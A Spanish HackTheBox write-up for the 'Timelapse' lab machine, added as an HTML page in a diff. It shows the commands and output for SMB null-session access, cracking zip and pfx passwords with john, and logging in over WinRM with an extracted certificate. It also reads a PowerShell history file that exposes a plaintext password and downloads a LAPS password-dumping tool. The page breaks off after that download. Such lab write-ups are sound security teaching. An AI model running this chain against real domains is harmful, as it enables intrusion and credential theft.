@@ -1,0 +1,546 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Timelapse (easy) · MiguelRega7</title>
+<meta name="description" content="- En este post vamos a resolver la maquina Timelapse de la plataforma de Hackthebox donde mediante SMB vamos a obtener un zip que contiene un archivo pfx pero antes de obtenerlo te"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Timelapse (easy)</h1><div class="meta"><span>◷</span><time>2024-03-30</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- En este post vamos a resolver la maquina Timelapse de la plataforma de Hackthebox donde mediante SMB vamos a obtener un zip que contiene un archivo pfx pero antes de obtenerlo te.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeracion">Enumeracion</a><a href="#shell-as-legacyy">Shell as legacyy</a><a href="#user-txt">User.txt</a><a href="#shell-as-svc-deploy">Shell as svc_deploy</a><a href="#escalada-de-privilegios-and-shell-as-administrator">Escalada de privilegios and Shell as administrator</a><a href="#root-txt">root.txt</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png">
+</p>
+
+<ul>
+<li>En este post vamos a resolver la maquina Timelapse de la plataforma de Hackthebox donde mediante SMB vamos a obtener un zip que contiene un archivo pfx pero antes de obtenerlo tendremos que crackear el zip ya que nos pide la contraseña estaremos usando openssl para obtener un cert y una key usando el pfx una vez obtenemos eso nos conectaremos con evil-winrm y gracias a que un usuario forma parte del grupo LAPS_Readers vamos a poder ver la contraseña del usuario gracias al historial de powershell para la escalada de privilegios estaremos abusando del grupo LAPS_Readers y usaremos Get-LAPSPasswords para dumpear las contraseñas entre ellas la del Administrator.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ping -c 1 10.129.141.32
+PING 10.129.141.32 (10.129.141.32) 56(84) bytes of data.
+64 bytes from 10.129.141.32: icmp_seq=1 ttl=127 time=147 ms
+
+--- 10.129.141.32 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 147.439/147.439/147.439/0.000 ms
+❯ whichSystem.py 10.129.141.32
+
+10.129.141.32 (ttl -&gt; 127): Windows
+</code></pre></div></div>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49697 10.129.141.32 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 12:08 CST
+Nmap scan report for 10.129.141.32
+Host is up (0.15s latency).
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-07-27 02:08:34Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2023-07-27T02:10:06+00:00; +7h59m59s from scanner time.
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+| tls-alpn: 
+|_  http/1.1
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49697/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-07-27T02:09:27
+|_  start_date: N/A
+</code></pre></div></div>
+<h2 id="enumeracion">Enumeracion</h2>
+<ul>
+<li>Vamos a ver primeramente ante que estamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.141.32
+SMB         10.129.141.32   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li>Vamos agregar el dominio al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;10.129.141.32 timelapse.htb dc01.timelapse.htb&quot; | sudo tee -a /etc/host
+10.129.141.32 timelapse.htb dc01.timelapse.htb
+</code></pre></div></div>
+<ul>
+<li>Vamos a comenzar viendo los recursos compartidos por <strong>SMB</strong> para ver si podemos listar algunos empleando un <strong>Null Session</strong> por que de momento no contamos con credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -L 10.129.141.32 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shares          Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code></pre></div></div>
+<ul>
+<li>Vemos un archivo <code>winrm_backup.zip</code> vamos a traerlo a nuestra maquina de atacante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -N //10.129.141.32/Shares
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Oct 25 10:39:15 2021
+  ..                                  D        0  Mon Oct 25 10:39:15 2021
+  Dev                                 D        0  Mon Oct 25 14:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021
+
+		6367231 blocks of size 4096. 1245724 blocks available
+smb: \&gt; cd Dev
+smb: \Dev\&gt; dir
+  .                                   D        0  Mon Oct 25 14:40:06 2021
+  ..                                  D        0  Mon Oct 25 14:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021
+
+		6367231 blocks of size 4096. 1244581 blocks available
+smb: \Dev\&gt; get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
+smb: \Dev\&gt; 
+</code></pre></div></div>
+<h2 id="shell-as-legacyy">Shell as legacyy</h2>
+<ul>
+<li>Vemos que dentro hay un <code>.pfx</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ 7z l winrm_backup.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 2611 bytes (3 KiB)
+
+Listing archive: winrm_backup.zip
+
+--
+Path = winrm_backup.zip
+Type = zip
+Physical Size = 2611
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2021-10-25 08:21:20 .....         2555         2405  legacyy_dev_auth.pfx
+------------------- ----- ------------ ------------  ------------------------
+2021-10-25 08:21:20               2555         2405  1 files
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web1.png">
+</p>
+
+<ul>
+<li>Nos pide contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ 7z x winrm_backup.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 2611 bytes (3 KiB)
+
+Extracting archive: winrm_backup.zip
+--
+Path = winrm_backup.zip
+Type = zip
+Physical Size = 2611
+
+    
+Enter password (will not be echoed):
+</code></pre></div></div>
+<ul>
+<li>Vamos a usar <code>john</code> para poder ver la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ zip2john winrm_backup.zip &gt; hash
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+1g 0:00:00:00 DONE (2023-07-26 12:27) 1.428g/s 4956Kp/s 4956Kc/s 4956KC/s surfroxy154..superview1024
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<ul>
+<li>Ahora si podemos traernos el archivo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx    
+</code></pre></div></div>
+<ul>
+<li><p>Si recordamos nos dicen que <code>pfx</code> es una clave privada de un certificado así que necesitamos extraer ese certificado <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a>.</p>
+</li>
+<li><p>Siguiente los pasos del articulo vemos que si hacemos lo siguiente para extraer la <strong>private key</strong> nos pide contraseña.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web2.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert
+Enter Import Password:
+</code></pre></div></div>
+<ul>
+<li>Pero bueno podemos usar <code>pfx2john</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; hash
+❯ john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 512/512 AVX512BW 16x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)
+1g 0:00:00:42 DONE (2023-07-26 12:48) 0.02365g/s 76436p/s 76436c/s 76436C/s thuglife06..thsco04
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web3.png">
+</p>
+
+<ul>
+<li><p>Ahora si podemos seguir.</p>
+</li>
+<li><p>Vamos a extraer el certificado y la clave privada.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert
+Enter Import Password:
+❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+</code></pre></div></div>
+<ul>
+<li>El puerto <code>5986/tcp</code> es abierto así que nos podemos conectar empleando <code>winrm</code> con el <code>cert</code> y la <code>key</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -h
+                                        
+Evil-WinRM shell v3.5
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -&gt; CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -S -i 10.129.141.32 -c cert -k key
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+Enter PEM pass phrase: thuglegacy
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami
+timelapse\legacyy
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</code></pre></div></div>
+<h2 id="user-txt">User.txt</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users&gt; Get-ChildItem -Path C:\ -Recurse -Filter &quot;user.txt&quot; -ErrorAction SilentlyContinue
+Enter PEM pass phrase:
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/26/2023   7:01 PM             34 user.txt
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type C:\Users\legacyy\Desktop\user.txt
+9a2077a3a7ce5b1fec186ad86b228077
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</code></pre></div></div>
+<h2 id="shell-as-svc-deploy">Shell as svc_deploy</h2>
+<ul>
+<li>Aquí vemos varios usuarios.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; net user
+Enter PEM pass phrase:
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            babywyrm                 Guest
+krbtgt                   legacyy                  payl0ad
+sinfulz                  svc_deploy               thecybergeek
+TRX
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Si examinamos a que grupos pertenecen cada usuario vemos que <code>svc_deploy</code> forma parte de <code>LAPS_Readers</code> ademas forma parte del grupo <code>Remote Management Users</code> así que podemos conectarnos con <code>evil-winrm</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; net user svc_deploy
+Enter PEM pass phrase:
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li><a href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> en este caso como estamos en <code>powershell</code> podemos ver el historial de comandos como el <code>bash_history</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/timelapse/web4.png">
+</p>
+
+<ul>
+<li>Y hay vemos la contraseña del usuario <code>E3R$Q62^12p7PLlC%KWaxuaV</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\legacyy&gt; type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Enter PEM pass phrase:
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+*Evil-WinRM* PS C:\Users\legacyy&gt; 
+</code></pre></div></div>
+<ul>
+<li>Ahora nos podemos conectar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -S -i 10.129.141.32 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami
+timelapse\svc_deploy
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; 
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios-and-shell-as-administrator">Escalada de privilegios and Shell as administrator</h2>
+<ul>
+<li>Como formamos parte del grupo <code>LAPS_Readers</code> vamos a usar este recurso <a href="https://github.com/kfosaaen/Get-LAPSPasswords">https://github.com/kfosaaen/Get-LAPSPasswords</a> para ver si podemos dumpear todas las contraseñas almacenadas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wget https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
+--2023-07-26 13:59:10--  https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
+Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 7419 (7.2K) [text/plain]
+Grabando a: «Get-LAPSPasswords.ps1»
+
+Get-LAPSPasswords.ps1           100%[=======================================================&gt;]   7.25K  --.-KB/s    en 0s      
+
+2023-07-26 13:59:10 (34.4 MB/s) - «Get-LAPSPasswords.ps1» guardado [7419/7419]
+</code></pre></div></div>
+<ul>
